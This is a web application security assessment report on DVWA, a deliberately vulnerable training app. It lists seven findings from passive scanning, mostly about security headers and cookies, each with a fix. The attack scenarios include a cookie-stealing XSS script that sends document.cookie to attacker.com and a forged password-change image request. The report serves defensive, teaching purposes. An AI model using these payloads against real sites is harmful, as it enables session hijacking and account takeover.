# DVWA Security Assessment Report
## Project KAVACH – Workstream B
### Web Application Security Assessment

---

# Executive Summary

A security assessment was conducted against the Damn Vulnerable Web Application (DVWA) deployed in a Docker-based environment. The assessment leveraged OWASP ZAP passive scanning and manual validation techniques to identify security weaknesses affecting application security posture.

The assessment identified multiple security misconfigurations, insecure cookie settings, missing browser security controls, and information disclosure issues. While no critical vulnerabilities were identified through passive scanning alone, the observed weaknesses increase the likelihood and impact of attacks such as Cross-Site Scripting (XSS), Clickjacking, Session Hijacking, MIME-sniffing attacks, and Cross-Site Request Forgery (CSRF).

---

# Assessment Scope

| Parameter | Value |
|------------|---------|
| Application | DVWA |
| Environment | Docker |
| Testing Tool | OWASP ZAP 2.17 |
| Testing Type | Passive Security Assessment |
| Platform | Kali Linux |
| Assessment Date | 2026-05-31 |

---

# Security Findings Summary

| Finding ID | Finding Name | Severity |
|------------|--------------|----------|
| DVWA-001 | Missing Content Security Policy | Medium |
| DVWA-002 | Missing Anti-Clickjacking Header | Medium |
| DVWA-003 | Cookie Missing HttpOnly | Low |
| DVWA-004 | Cookie Missing SameSite Attribute | Low |
| DVWA-005 | Missing X-Content-Type-Options | Low |
| DVWA-006 | Server Version Disclosure | Low |
| DVWA-007 | Banner Information Leakage | Low |

---

# Finding DVWA-001
## Missing Content Security Policy (CSP)

### Severity
Medium

### OWASP Top 10 Mapping
A05:2021 – Security Misconfiguration

### CWE Mapping
CWE-693 – Protection Mechanism Failure

---

## Evidence

### Request

GET / HTTP/1.1

Host: localhost

### Response

HTTP/1.1 200 OK

Server: Apache

Set-Cookie: PHPSESSID=abc123

### Missing Security Header

Content-Security-Policy

---

## Root Cause

The application fails to define a Content Security Policy (CSP) that restricts the execution of browser-side resources such as JavaScript, images, stylesheets, frames, and AJAX requests.

Browsers therefore execute any script that appears within the page context.

---

## Attack Scenario

An attacker identifies an XSS vulnerability and injects:

<script>
document.location=
"http://attacker.com?cookie="+document.cookie;
</script>

Without CSP restrictions the browser executes the payload successfully.

---

## Potential Impact

• Session hijacking

• Credential theft

• Browser-based malware delivery

• Phishing attacks

• Data exfiltration

---

## Recommended Remediation

Content-Security-Policy:
default-src 'self';
script-src 'self';
object-src 'none';
frame-ancestors 'none';
base-uri 'self';

---

# Finding DVWA-002
## Missing Anti-Clickjacking Protection

### Severity
Medium

### OWASP Top 10 Mapping
A05:2021 – Security Misconfiguration

### CWE Mapping
CWE-1021

---

## Evidence

### Missing Header

X-Frame-Options

### Missing CSP Directive

frame-ancestors

---

## Root Cause

The application allows rendering within external iframes.

---

## Attack Scenario

Attacker creates:

<iframe src="http://dvwa.local"></iframe>

Invisible overlays trick users into clicking buttons or submitting forms.

---

## Potential Impact

• Unauthorized transactions

• Account modifications

• Password changes

• CSRF amplification

---

## Recommended Remediation

X-Frame-Options: DENY

OR

Content-Security-Policy:
frame-ancestors 'none';

---

# Finding DVWA-003
## Cookie Missing HttpOnly Attribute

### Severity
Low

### OWASP Top 10 Mapping
A07:2021 – Identification and Authentication Failures

### CWE Mapping
CWE-1004

---

## Evidence

### Observed Cookie

Set-Cookie:
PHPSESSID=abc123

### Missing Attribute

HttpOnly

---

## Root Cause

Session cookies remain accessible through JavaScript.

---

## Attack Scenario

If an XSS vulnerability exists:

alert(document.cookie)

returns:

PHPSESSID=abc123

Attacker steals authenticated session.

---

## Potential Impact

• Session theft

• Account compromise

• Privilege abuse

---

## Recommended Remediation

Set-Cookie:
PHPSESSID=<value>;
HttpOnly;
Secure;
SameSite=Strict

---

# Finding DVWA-004
## Cookie Missing SameSite Attribute

### Severity
Low

### OWASP Top 10 Mapping
A07:2021 – Identification and Authentication Failures

---

## Evidence

### Observed Cookie

Set-Cookie:
PHPSESSID=abc123

### Missing Attribute

SameSite

---

## Root Cause

Browser automatically transmits session cookies during cross-origin requests.

---

## Attack Scenario

Attacker hosts:

<img src="http://dvwa/changePassword.php?new=hacked">

Victim browser automatically sends authentication cookie.

---

## Potential Impact

• Cross-Site Request Forgery

• Unauthorized account changes

• User impersonation

---

## Recommended Remediation

Set-Cookie:
PHPSESSID=<value>;
SameSite=Strict

---

# Finding DVWA-005
## Missing X-Content-Type-Options Header

### Severity
Low

### OWASP Top 10 Mapping
A05:2021 – Security Misconfiguration

---

## Evidence

### Missing Header

X-Content-Type-Options: nosniff

---

## Root Cause

Browser permitted to MIME-sniff content types.

---

## Attack Scenario

Attacker uploads:

malicious.jpg

Actual file contains:

<script>alert(1)</script>

Browser interprets content as executable code.

---

## Potential Impact

• XSS

• Malware delivery

• Content-type confusion

---

## Recommended Remediation

X-Content-Type-Options: nosniff

---

# Finding DVWA-006
## Server Version Disclosure

### Severity
Low

### OWASP Top 10 Mapping
A05:2021 – Security Misconfiguration

### CWE Mapping
CWE-200

---

## Evidence

Server: Apache/2.x.x

X-Powered-By: PHP/8.x

---

## Root Cause

Default web server configuration exposes software versions.

---

## Attack Scenario

Attacker fingerprints environment and searches for public CVEs matching exposed versions.

---

## Potential Impact

• Accelerated reconnaissance

• Targeted exploitation

• Attack surface reduction failure

---

## Recommended Remediation

Apache:

ServerTokens Prod

ServerSignature Off

PHP:

expose_php = Off

---

# Finding DVWA-007
## Banner Information Leakage

### Severity
Low

### OWASP Top 10 Mapping
A05:2021 – Security Misconfiguration

---

## Evidence

Server: Apache

X-Powered-By: PHP

---

## Root Cause

Application unnecessarily exposes underlying technology stack.

---

## Potential Impact

• Technology fingerprinting

• Reconnaissance support

• Exploit selection assistance

---

## Recommended Remediation

Remove unnecessary response headers.

Disable version exposure.

---

# Security Header Gap Analysis

| Header | Status | Security Impact |
|----------|---------|----------------|
| Content-Security-Policy | Missing | Increased XSS Risk |
| X-Frame-Options | Missing | Clickjacking |
| X-Content-Type-Options | Missing | MIME Sniffing |
| Strict-Transport-Security | Missing | HTTPS Downgrade |
| Referrer-Policy | Missing | Information Leakage |
| Permissions-Policy | Missing | Browser Feature Abuse |

---

# OWASP Top 10 Mapping

| Finding | OWASP Category |
|----------|----------------|
| CSP Missing | A05 |
| Clickjacking | A05 |
| Missing HttpOnly | A07 |
| Missing SameSite | A07 |
| Missing X-Content-Type | A05 |
| Version Disclosure | A05 |
| Banner Leakage | A05 |

---

# Risk Register

| ID | Finding | Severity | Risk |
|----|----------|----------|------|
| DVWA-001 | CSP Missing | Medium | XSS Amplification |
| DVWA-002 | Clickjacking | Medium | UI Redressing |
| DVWA-003 | Missing HttpOnly | Low | Session Theft |
| DVWA-004 | Missing SameSite | Low | CSRF |
| DVWA-005 | Missing X-Content-Type | Low | MIME Sniffing |
| DVWA-006 | Version Disclosure | Low | Reconnaissance |
| DVWA-007 | Banner Leakage | Low | Fingerprinting |

---

# Overall Risk Assessment

| Category | Rating |
|------------|---------|
| Confidentiality | Medium |
| Integrity | Medium |
| Availability | Low |
| Exploitability | Medium |
| Business Risk | Medium |

---

# Recommendations

## Immediate Actions

1. Implement Content Security Policy.
2. Enable X-Frame-Options.
3. Enable HttpOnly cookies.
4. Enable SameSite cookies.
5. Enable X-Content-Type-Options.
6. Remove software version disclosure.

---

## Short-Term Actions

1. Perform authenticated ZAP scans.
2. Review session management implementation.
3. Implement CSRF tokens.
4. Enforce HTTPS.

---

## Long-Term Actions

1. Integrate SAST and DAST into CI/CD.
2. Adopt secure coding standards.
3. Conduct periodic penetration testing.
4. Implement centralized security monitoring.

---

# Conclusion

The DVWA assessment identified several security misconfigurations and browser-side protection weaknesses that increase the application's exposure to client-side attacks. While no critical vulnerabilities were observed during passive assessment, exploitation of these weaknesses in combination with application-layer vulnerabilities such as XSS or CSRF could lead to session compromise, credential theft, and unauthorized user actions.

Addressing the identified findings will significantly improve the application's security posture and align the environment with modern web application security best practices.
